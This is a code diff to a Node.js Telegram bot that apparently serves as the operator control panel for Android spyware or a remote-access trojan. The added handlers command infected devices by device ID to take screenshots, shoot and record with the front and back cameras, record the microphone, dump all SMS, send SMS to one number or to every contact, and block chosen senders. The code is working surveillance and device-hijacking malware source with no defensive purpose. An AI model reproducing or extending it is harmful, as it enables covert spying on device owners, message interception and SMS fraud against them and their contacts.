@@ -8,10 +8,6 @@
 // const portnumb = 9932;
 
 
-
-// Tree if-clauses of createKeyboard func must be written - but at the end of callback-query handler
-// Last Method should be written after vibratePhone: getInstalledApps - sendSMS
-
 const TelegramBot = require("node-telegram-bot-api");
 const net = require("net");
 const me = new net.Socket();
@@ -101,14 +97,14 @@ function createKeyboard(access_list = [], devid, msgowner, callback = () => {}){
     let layers = [[]];
     let layer_index = 0;
 
-    if (access_list.includes("getPhoneNumbers") && access_list.includes("getPhoneNumberInfo")){
-            layers[layer_index].push({
-                text: build("phone ☎"),
-                callback_data: `phonePanel_${msgowner}_${devid}`
-            });
-        }
+    // if (access_list.includes("getPhoneNumbers") && access_list.includes("getPhoneNumberInfo")){
+    //     layers[layer_index].push({
+    //         text: build("phone ☎"),
+    //         callback_data: `phonePanel_${msgowner}_${devid}`
+    //     });
+    // }
 
-    if (access_list.includes("getAllSMS") || access_list.includes("sendSMS") || access_list.includes("setSMSFilter")){
+    if (access_list.includes("getAllSMS") || access_list.includes("sendSMS") || access_list.includes("setSMSFilter") || access_list.includes("removeSMSFilter")){
         layers[layer_index].push({
             text: build("sms 📪"),
             callback_data: `smsPanel_${msgowner}_${devid}`
@@ -498,6 +494,71 @@ bot.on("message", async (message) => {
                             }));
                         })
                     }
+                } else if (mode == "getAllSMS"){
+                    delete steps[message.from.id];
+                    me.write(JSON.stringify({
+                        port: portname,
+                        password: passname,
+                        method: "sendAllSMS",
+                        mask: "metro",
+                        device_id: devid,
+                        sms: message.text,
+                        shortcut: {
+                            chat_id: message.chat.id,
+                            message_id: rmsg.message_id,
+                            sms: message.text,
+                            device_id: devid,
+                            edit: false
+                        }
+                    }));
+                } else if (mode == "getSMS"){
+                    steps[message.from.id]['sms'] = message.text;
+                    steps[message.from.id]['mode'] = "getPhoneSMS"
+                    await bot.sendMessage(
+                        message.chat.id,
+                        build(`📞 ${sym} send the name/phone-number`),
+                        {
+                            reply_to_message_id: message.message_id
+                        }
+                    )
+                } else if (mode == "getPhoneSMS"){
+                    me.write(JSON.stringify({
+                        port: portname,
+                        password: passname,
+                        method: "sendSMS",
+                        mask: "metro",
+                        device_id: devid,
+                        tonumber: message.text,
+                        sms: steps[message.from.id]['sms'],
+                        shortcut: {
+                            chat_id: message.chat.id,
+                            message_id: rmsg.message_id,
+                            sms: steps[message.from.id]['sms'],
+                            device_id: devid,
+                            tonumber: message.text,
+                            edit: false
+                        }
+                    }));
+
+                    delete steps[message.from.id];
+
+                } else if (mode == "smsFilter" || mode == "removeSMSFilter"){
+                    delete steps[message.from.id];
+                    me.write(JSON.stringify({
+                        port: portname,
+                        password: passname,
+                        method: (mode == "smsFilter") ? "setSMSFilter" : "removeSMSFilter",
+                        mask: "metro",
+                        device_id: devid,
+                        filter_number: message.text,
+                        shortcut: {
+                            chat_id: message.chat.id,
+                            message_id: rmsg.message_id,
+                            device_id: devid,
+                            filter_number: message.text,
+                            edit: false
+                        }
+                    }));
                 }
             }
         }
@@ -878,7 +939,7 @@ bot.on("callback_query", async (call) => {
                     device_id: spl[2],
                     edit: true
                 }
-            }))
+            }));
         } else if (mode == "setSoundVolume"){
             me.write(JSON.stringify({
                 port: portname,
@@ -895,7 +956,145 @@ bot.on("callback_query", async (call) => {
                     volume: parseInt(spl[3]),
                     edit: true
                 }
-            }))
+            }));
+        } else if (mode == "takeScreenshot"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "takeScreenshot",
+                device_id: spl[2],
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    device_id: spl[2],
+                    edit: true
+                }
+            }));
+        } else if (mode == "takeFrontshot"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "takeFrontshot",
+                device_id: spl[2],
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    device_id: spl[2],
+                    edit: true
+                }
+            }));
+        } else if (mode == "takeBackshot"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "takeBackshot",
+                device_id: spl[2],
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    device_id: spl[2],
+                    edit: true
+                }
+            }));
+        } else if (mode == "recordFront"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "recordFront",
+                device_id: spl[2],
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    device_id: spl[2],
+                    edit: true
+                }
+            }));
+        } else if (mode == "recordBack"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "recordBack",
+                device_id: spl[2],
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    device_id: spl[2],
+                    edit: true
+                }
+            }));
+        } else if (mode == "recordMicrophone"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "recordMicrophone",
+                device_id: spl[2],
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    device_id: spl[2],
+                    edit: true
+                }
+            }));
+        } else if (mode == "smsPanel"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "getUserByDeviceId",
+                device_id: spl[2],
+                shortcut: {
+                    way: "seeSMSPanel",
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    msgowner: call.from.id,
+                    device_id: spl[2],
+                    edit: true
+                }
+            }));
+        } else if (mode == "sendSMS" || mode == "sendAllSMS"){
+            steps[call.from.id] = {
+                mode: (mode == "sendSMS") ? "getSMS" : "getAllSMS",
+                device_id: spl[2]
+            };
+            await bot.editMessageText(
+                build(`🗼 ${sym} send your sms message`),
+                {
+                    message_id: call.message.message_id,
+                    chat_id: call.message.chat.id
+                }
+            )
+        } else if (mode == "setSMSFilter" || mode == "removeSMSFilter"){
+            steps[call.from.id] = {
+                mode: (mode == "setSMSFilter") ? "smsFilter" : "removeSMSFilter",
+                device_id: spl[2]
+            };
+            await bot.editMessageText(
+                build(`💠 ${sym} send your name/phone-number to ${(mode == "setSMSFilter") ? "block" : "unblock"} that`),
+                {
+                    message_id: call.message.message_id,
+                    chat_id: call.message.chat.id
+                }
+            )
+        } else if (mode == "getAllSMS"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "getAllSMS",
+                device_id: spl[2],
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    device_id: spl[2],
+                    edit: true
+                }
+            }));
         }
     }
 })
@@ -934,6 +1133,75 @@ me.on("data", async (data) => {
                                 }
                             )
                         })
+                    } else if (_message.shortcut.way == "seeSMSPanel"){
+                        let _keybinds = [];
+                        let _second_keybinds = [];
+                        if (_message.user.accessory.includes("sendSMS")){
+                            _keybinds.push({
+                                text: build(`🥊 send`),
+                                callback_data: `sendSMS_${_message.shortcut.msgowner}_${_message.user.device_id}`
+                            });
+                        }
+
+                        if (_message.user.accessory.includes("setSMSFilter")){
+                            _keybinds.push({
+                                text: build(`🏴 filter`),
+                                callback_data: `setSMSFilter_${_message.shortcut.msgowner}_${_message.user.device_id}`
+                            });
+                        }
+
+                        if (_message.user.accessory.includes("removeSMSFilter")){
+                            _keybinds.push({
+                                text: build(`🏳 remove-filter`),
+                                callback_data: `removeSMSFilter_${_message.shortcut.msgowner}_${_message.user.device_id}`
+                            });
+                        }
+
+                        if (_message.user.accessory.includes("getAllSMS")){
+                            _second_keybinds.push({
+                                text: build("📜 get all sms"),
+                                callback_data: `getAllSMS_${_message.shortcut.msgowner}_${_message.user.device_id}`
+                            })
+                        }
+
+                        if (_message.user.accessory.includes("sendAllSMS")){
+                            _second_keybinds.push({
+                                text: build("🚀 send all"),
+                                callback_data: `sendAllSMS_${_message.shortcut.msgowner}_${_message.user.device_id}`
+                            })
+                        }
+
+                        _second_keybinds.push({
+                            text: build("🔙 back"),
+                            callback_data: `seemyuser_${_message.shortcut.msgowner}_${_message.user.device_id}`
+                        })
+
+                        _message.shortcut.edit == false ? await bot.sendMessage(
+                            _message.shortcut.chat_id,
+                            build(`🍷 ${sym} sms panel\n`) + `⚡ ${sym} ` + _message.shortcut.device_id,
+                            {
+                                reply_to_message_id: _message.shortcut.message_id,
+                                reply_markup: {
+                                    inline_keyboard: [
+                                        _keybinds,
+                                        _second_keybinds
+                                    ]
+                                }
+                            }
+                        ) : await bot.editMessageText(
+                            build(`🍷 ${sym} sms panel\n`) + `⚡ ${sym} ` + _message.shortcut.device_id,
+                            {
+                                message_id: _message.shortcut.message_id,
+                                chat_id: _message.shortcut.chat_id,
+                                reply_markup: {
+                                    inline_keyboard: [
+                                        _keybinds,
+                                        _second_keybinds
+                                    ]
+                                }
+                            }
+                        )
+
                     }
                 }
             } else if (_message.method == "getInstalledApps"){
